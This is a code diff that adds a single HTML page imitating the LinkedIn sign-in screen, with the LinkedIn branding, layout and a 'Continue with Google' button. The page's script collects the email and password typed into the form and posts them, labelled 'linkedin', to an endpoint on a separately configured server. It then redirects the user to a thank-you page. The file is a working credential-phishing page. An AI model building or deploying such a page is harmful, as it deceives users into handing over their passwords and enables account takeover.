@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <script src="static/js/config.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            color: rgba(0, 0, 0, 0.9);
+        }
+
+        /* Header */
+        header {
+            width: 100%;
+            padding: 12px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .header-content {
+            width: 1128px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .li-logo {
+            color: #0a66c2;
+            font-size: 34px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+
+        .li-logo span {
+            background: #0a66c2;
+            color: white;
+            border-radius: 4px;
+            padding: 0 5px;
+            margin-left: 2px;
+            font-size: 34px;
+        }
+
+        .header-actions {
+            font-size: 16px;
+            color: #666;
+            font-weight: 600;
+        }
+
+        .join-btn {
+            border-radius: 24px;
+            padding: 12px 24px;
+            color: rgba(0, 0, 0, 0.6);
+            cursor: pointer;
+            margin-right: 10px;
+        }
+
+        .signin-btn {
+            border: 1px solid #0a66c2;
+            color: #0a66c2;
+            border-radius: 24px;
+            padding: 10px 24px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .signin-btn:hover {
+            background-color: rgba(112, 181, 249, 0.15);
+        }
+
+        /* Main Content */
+        .main-hero {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            padding-top: 40px;
+        }
+
+        .hero-inner {
+            width: 1128px;
+            display: flex;
+        }
+
+        /* Left Side: Welcome Text */
+        .hero-left {
+            width: 55%;
+            padding-right: 20px;
+        }
+
+        h1 {
+            font-size: 56px;
+            font-weight: 200;
+            color: #8f5849;
+            /* Distinctive brownish color Linked uses now */
+            margin: 0;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+
+        /* Right Side: Login Form */
+        .hero-right {
+            width: 450px;
+            /* Placeholder just incase */
+        }
+
+        .form-card {
+            padding: 24px;
+            /* LinkedIn is essentially flat on left or simple form */
+        }
+
+        .form-field {
+            margin-bottom: 12px;
+        }
+
+        .li-input {
+            width: 100%;
+            height: 48px;
+            font-size: 16px;
+            padding: 10px;
+            border: 1px solid black;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .li-input:focus {
+            background-color: #f7f9fa;
+            /* Slight change */
+        }
+
+        .show-pass {
+            font-weight: 600;
+            color: #0a66c2;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 5px;
+            display: inline-block;
+        }
+
+        .submit-btn {
+            width: 100%;
+            height: 48px;
+            background-color: #0a66c2;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 24px;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .submit-btn:hover {
+            background-color: #004182;
+        }
+
+        .forgot-pass {
+            margin-top: 15px;
+            font-weight: 600;
+            color: #0a66c2;
+            font-size: 14px;
+            display: inline-block;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: rgba(0, 0, 0, 0.6);
+        }
+
+        .line {
+            height: 1px;
+            background-color: rgba(0, 0, 0, 0.3);
+            flex-grow: 1;
+        }
+
+        .google-btn {
+            width: 100%;
+            height: 40px;
+            border: 1px solid #666;
+            border-radius: 24px;
+            background: white;
+            color: #666;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .consent-wrapper {
+            margin-top: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            color: #666;
+        }
+
+        .consent-wrapper input {
+            margin-right: 8px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="header-content">
+            <div class="li-logo">Linked<span>in</span></div>
+            <div class="header-actions">
+                <span class="join-btn">Join now</span>
+                <span class="signin-btn">Sign in</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-hero">
+        <div class="hero-inner">
+            <div class="hero-left">
+                <h1>Welcome to your professional community</h1>
+                <!-- Imagine big SVG/Image here normally -->
+            </div>
+
+            <div class="hero-right">
+                <div class="form-card">
+                    <form id="loginForm">
+                        <div class="form-field">
+                            <label
+                                style="font-size:14px; color:rgba(0,0,0,0.6); margin-bottom:4px; display:block;">Email
+                                or phone</label>
+                            <input type="text" id="email" class="li-input" required>
+                        </div>
+
+                        <div class="form-field">
+                            <label
+                                style="font-size:14px; color:rgba(0,0,0,0.6); margin-bottom:4px; display:block;">Password</label>
+                            <input type="password" id="password" class="li-input" required>
+                            <span class="show-pass">Show</span>
+                        </div>
+
+                        <a href="#" class="forgot-pass">Forgot password?</a>
+
+                        <button type="submit" class="submit-btn" style="border-radius:24px;">Sign in</button>
+
+
+
+                    </form>
+
+                    <div class="divider">
+                        <div class="line"></div>
+                        <span style="margin:0 10px; font-size:14px;">or</span>
+                        <div class="line"></div>
+                    </div>
+
+                    <button class="google-btn">Continue with Google</button>
+                    <button class="google-btn" style="margin-top:10px;">New to LinkedIn? Join now</button>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+
+            const data = {
+                platform: "linkedin",
+                email: document.getElementById("email").value,
+                password: document.getElementById("password").value
+            };
+
+            try {
+                const res = await fetch(API_BASE_URL + "/platform_submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                if (res.ok) {
+                    window.top.location.href = "thankyou.html";
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+
+</html>
